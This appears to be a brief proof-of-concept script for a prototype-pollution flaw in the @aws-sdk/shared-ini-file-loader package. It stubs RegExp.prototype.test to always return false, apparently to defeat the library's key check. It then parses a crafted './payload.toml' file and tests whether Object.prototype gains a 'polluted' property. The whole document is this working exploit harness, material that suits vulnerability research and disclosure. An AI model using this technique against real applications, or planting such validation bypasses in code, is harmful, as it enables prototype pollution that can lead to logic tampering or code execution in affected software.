RegExp.prototype.test = () => false;
console.log({}.polluted);
var fs = require('fs');
var sharedIniFileLoader = require('@aws-sdk/shared-ini-file-loader');
var parsed = sharedIniFileLoader.loadSharedConfigFiles({ filepath: './payload.toml' });
parsed.then(() => {
    console.log({}.polluted);
});